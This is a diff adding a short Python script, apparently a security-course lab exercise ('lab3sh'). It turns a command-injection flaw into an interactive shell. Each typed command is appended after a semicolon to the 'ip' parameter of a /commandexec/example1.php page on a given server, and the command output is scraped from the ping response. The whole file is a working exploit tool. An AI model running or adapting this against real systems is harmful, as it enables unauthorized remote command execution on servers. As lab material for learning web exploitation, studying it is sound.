@@ -1,0 +1,47 @@
+#!/usr/bin/python3
+
+import subprocess
+import sys
+import os
+import requests
+
+
+def interactive_shell(site_IP):
+    while True:
+        in_str = input('lab3sh> ')
+        if in_str == "exit":
+            print('Good bye')
+            break
+        else:
+            in_str = in_str.replace(' ', '%20')
+            url = f'http://{site_IP}/commandexec/example1.php?ip=127.0.0.1;{in_str}'
+            response = requests.get(url)
+            parse_response(response.text)
+    return
+
+
+def parse_response(response):
+    target = False
+    list = response.split('\n')
+    for x in list:
+        x = x.replace('\n', '')
+        if x == '</pre>':
+            target = False
+            break
+        if target:
+            print(x)
+        if x[0:3] == 'rtt':
+            target = True
+
+
+if __name__ == "__main__":
+    n = len(sys.argv)
+    if n != 2:
+        print('Enter Server IP address')
+        print(f'Total arguments passed: {n}')
+    else:
+        args = sys.argv[1:]
+        site_IP = args[0]
+        interactive_shell(site_IP)
+        if os.path.exists("temp.html"):
+            os.remove("temp.html")
